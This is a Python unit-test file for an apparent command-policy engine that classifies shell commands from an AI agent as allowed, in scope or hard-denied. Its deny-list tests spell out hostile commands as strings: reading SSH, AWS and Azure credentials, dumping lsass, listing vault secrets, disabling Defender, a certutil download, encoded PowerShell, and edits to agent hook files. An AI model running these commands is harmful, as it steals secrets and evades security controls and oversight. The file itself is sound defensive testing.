"""Dangerous samples are strings sent to the classifier, never executed."""

import base64
import importlib.util
from pathlib import Path
import tempfile
import unittest

SPEC = importlib.util.spec_from_file_location(
    "guardian_policy",
    Path(__file__).resolve().parents[2] / ".guardian/engine/policy.py",
)
policy = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(policy)


class PolicyTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        (self.root / "a.txt").write_text("fixture")

    def test_diagnostics(self):
        for shell, command in [
            ("bash", "pwd"),
            ("powershell", "Get-Date"),
            ("powershell", "Get-Location"),
            ("powershell", "Get-Process"),
            ("powershell", "Get-ChildItem -Path ."),
        ]:
            with self.subTest(command=command):
                self.assertEqual(
                    policy.evaluate(command, shell, self.root)["decision"], "AUTO_ALLOW"
                )

    def test_file_operations_require_guardian(self):
        for shell, command in [
            ("bash", "cat a.txt"),
            ("bash", "cp a.txt b.txt"),
            ("bash", "rg -n -F -- fixture a.txt"),
            ("powershell", "Get-Content a.txt"),
            ("powershell", "Set-Content -Path b.txt -Value 'hello world'"),
            ("powershell", "Copy-Item -Path a.txt -Destination b.txt"),
        ]:
            with self.subTest(command=command):
                self.assertEqual(
                    policy.evaluate(command, shell, self.root)["decision"], "IN_SCOPE"
                )

    def test_cloud_reads_need_identity(self):
        for command in [
            "az account show",
            "az resource list",
            "az group show --name demo",
        ]:
            result = policy.evaluate(command, "bash", self.root)
            self.assertEqual(result["decision"], "IN_SCOPE")
            self.assertTrue(result["identity_required"])

    def test_all_hard_deny_categories(self):
        cases = [
            "cat mail.ost",
            "cat mail.pst",
            "cmdkey /list",
            "vaultcmd /list",
            "Get-StoredCredential",
            "[System.Security.Cryptography.ProtectedData]::Unprotect()",
            "cat 'Login Data'",
            "cat .ssh/id_rsa",
            "cat .aws/credentials",
            "cat .azure/accessTokens.json",
            "cat .kube/config",
            "Get-Credential | Out-File c.txt",
            "procdump lsass",
            "powershell -enc RwBlAHQALQBEAGEAdABlAA==",
            "certutil -urlcache https://example.invalid/a a",
            "bitsadmin /transfer x",
            "Set-MpPreference -DisableRealtimeMonitoring 1",
            "New-Service service",
            "schtasks /create",
            "Invoke-Command remote",
            "Compress-Archive . archive.zip",
            "Get-ADUser -Filter '*'",
            "az role assignment create",
            "az keyvault secret list",
            "for x in a b; do az keyvault secret show --name x; done",
            "az group delete --name demo",
            "az ad app create",
            "az network nsg list",
        ]
        for command in cases:
            for shell in ["bash", "powershell"]:
                with self.subTest(command=command, shell=shell):
                    self.assertEqual(
                        policy.evaluate(command, shell, self.root)["decision"],
                        "HARD_DENY",
                    )

    def test_unknown_and_dynamic_fail_closed(self):
        for command in [
            "python task.py",
            "node task.js",
            "npm test",
            "cat $HOME/a",
            "cat *.txt",
            "cat ../a.txt",
            "cat /etc/passwd",
            "cat .env",
            "cat .guardian/ledger.jsonl",
            "cat a.txt > b.txt",
            "pwd &",
            "cat a.txt\\ b.txt",
            "cat 'unfinished",
            "eval 'pwd'",
            "cat a.txt $(pwd)",
            "cat {a,/etc/passwd}",
            "cat ~root/file",
        ]:
            with self.subTest(command=command):
                self.assertEqual(
                    policy.evaluate(command, "bash", self.root)["decision"], "HARD_DENY"
                )

    def test_ast_compounds_and_wrappers(self):
        self.assertEqual(
            policy.evaluate("pwd; cat a.txt", "bash", self.root)["decision"], "IN_SCOPE"
        )
        self.assertEqual(
            policy.evaluate("bash -c 'cat a.txt'", "bash", self.root)["decision"],
            "IN_SCOPE",
        )
        self.assertEqual(
            policy.evaluate('pwsh -Command "Get-Date"', "powershell", self.root)[
                "decision"
            ],
            "IN_SCOPE",
        )
        self.assertEqual(
            policy.evaluate('cmd /c "pwd"', "bash", self.root)["decision"], "HARD_DENY"
        )
        self.assertEqual(
            policy.evaluate("pwd && cmdkey /list", "bash", self.root)["decision"],
            "HARD_DENY",
        )

    def test_links_and_directory_content_reads_denied(self):
        (self.root / "folder").mkdir()
        self.assertEqual(
            policy.evaluate("cat folder", "bash", self.root)["decision"], "HARD_DENY"
        )
        self.assertEqual(
            policy.evaluate("rg -F fixture .", "bash", self.root)["decision"],
            "HARD_DENY",
        )
        try:
            (self.root / "link.txt").symlink_to(self.root / "a.txt")
        except OSError:
            self.skipTest("Symlink creation unavailable")
        self.assertEqual(
            policy.evaluate("cat link.txt", "bash", self.root)["decision"], "HARD_DENY"
        )

    def test_powershell_splat_and_array_denied(self):
        for command in ["Get-Content @args", "Get-Content a,/etc/passwd"]:
            self.assertEqual(
                policy.evaluate(command, "powershell", self.root)["decision"],
                "HARD_DENY",
            )

    def test_tamper_and_private_material_denied(self):
        for target in [
            "hooks/guard.py",
            "tools/agent_hooks.py",
            "AGENTS.md",
            "CLAUDE.md",
            ".vscode/settings.json",
            "Web Data",
            "server.pem",
            "bundle.pfx",
            "signing.key",
        ]:
            with self.subTest(target=target):
                command = f"Set-Content -Path '{target}' -Value text"
                self.assertEqual(
                    policy.evaluate(command, "powershell", self.root)["decision"],
                    "HARD_DENY",
                )

    def test_encoded_payload_is_audited_never_allowed(self):
        payload = base64.b64encode("Get-Date".encode("utf-16-le")).decode()
        for flag in ["-EncodedCommand", "-enc", "-e", "'-enc'"]:
            result = policy.evaluate(f"pwsh {flag} {payload}", "powershell", self.root)
            self.assertEqual(result["decision"], "HARD_DENY")
            self.assertIn("Get-Date", result["parsed_command"])
        for payload in ["!!invalid!!", "a" * 9000]:
            result = policy.evaluate(f"pwsh -enc {payload}", "powershell", self.root)
            self.assertEqual(result["decision"], "HARD_DENY")
            self.assertIn("could not", result["parsed_command"])

    def test_input_bound(self):
        self.assertEqual(
            policy.evaluate("x" * 20000, "bash", self.root)["decision"], "HARD_DENY"
        )
        self.assertEqual(
            policy.evaluate("pwd", "unknown", self.root)["decision"], "HARD_DENY"
        )
